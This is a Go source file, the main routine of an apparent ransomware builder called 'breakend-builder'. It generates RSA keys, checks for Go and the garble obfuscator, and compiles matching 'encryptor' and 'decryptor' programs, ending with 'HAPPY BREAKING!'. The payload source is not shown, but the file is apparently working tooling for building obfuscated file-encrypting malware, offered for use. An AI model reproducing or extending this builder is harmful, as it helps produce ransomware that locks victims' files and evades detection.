package main

import (
	"breakend-builder/cmd/rsagen"
	"breakend-builder/cmd/utils"
	"os"

	"github.com/charmbracelet/log"
)

func main() {
	// Generate RSA key pair and write to current directory
	if err := rsagen.GenerateRSAKeyPair(); err != nil {
		log.Fatal("Failed to generate RSA key pair", err)
	} else {
		log.Info("RSA key pair generated successfully")
	}

	// move the generated keys to the correct location
	if err := utils.MoveKeys(); err != nil {
		log.Fatal("Failed to move generated RSA key pair", err)
	} else {
		log.Info("RSA key pair moved successfully")
	}

	// Check if go is installed on the system
	if ok, err := utils.CheckGoInstalled(); err != nil {
		log.Fatal("Failed to check if go is installed", err)
	} else if !ok {
		log.Fatal("Go is not installed on the system")
	} else {
		log.Info("Go is installed on the system")
	}

	// Check if garble is installed on the system
	if ok, err := utils.CheckGarbleInstalled(); err != nil {
		log.Fatal("Failed to check if garble is installed", err)
	} else if !ok {
		log.Fatal("Garble is not installed on the system")
	} else {
		log.Info("Garble is installed on the system")
	}

	log.Info("All checks passed successfully")

	// Get absolute path of the current working directory
	fullPath, err := os.Getwd()
	if err != nil {
		log.Fatal("Failed to get the current working directory", err)
	}

	releasePath := fullPath + `\release`

	log.Warn("Building the encryptor using garble")
	if err := utils.BuildProject("encryptor", releasePath); err != nil {
		log.Fatal("Failed to build the encryptor project", err)
	} else {
		log.Info("Encryptor project built successfully")
	}

	log.Warn("Building the decryptor using garble")
	if err := utils.BuildProject("decryptor", releasePath); err != nil {
		log.Fatal("Failed to build the decryptor project", err)
	} else {
		log.Info("Decryptor project built successfully")
	}

	log.Info("Build process completed successfully: HAPPY BREAKING!")

}
